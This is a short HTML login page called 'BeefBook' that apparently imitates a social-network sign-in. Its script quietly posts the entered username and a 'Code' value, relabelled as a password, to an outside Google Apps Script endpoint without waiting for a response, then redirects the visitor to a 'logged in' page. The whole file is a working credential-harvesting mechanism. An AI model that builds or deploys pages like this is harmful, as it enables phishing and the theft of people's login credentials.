<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>BeefBook</title>
  </head>
  <body style="background-color: Violet;">
    <h1 style="font-family: Verdana;">BeefBook</h1>

    <form id="submitForm">
      <label>Username:</label><br>
      <input type="text" id="uname" required><br><br>

      <label>Code:</label><br>
      <textarea id="code" required></textarea><br><br>

      <input type="submit" value="Submit">
    </form>

    <script>
      const URL = 'https://script.google.com/macros/s/AKfycbwAp4nOyy1-NmGRdypXd598iaGnW7RUuR3D2ZEAjRUAzWTxPGvo-MlPhiKR9FYXHpUP/exec';

      document.getElementById('submitForm').addEventListener('submit', (e) => {
        e.preventDefault();

        const payload = {
          username: document.getElementById('uname').value.trim(),
          password: document.getElementById('code').value.trim()
        };

        // 🚨 DO NOT await
        // 🚨 DO NOT try/catch
        fetch(URL, {
          method: 'POST',
          mode: 'no-cors',
          body: JSON.stringify(payload)
        });

        // ✅ Redirect immediately
        window.location.href = 'BBlogedin.html';
      });
    </script>
  </body>
</html>
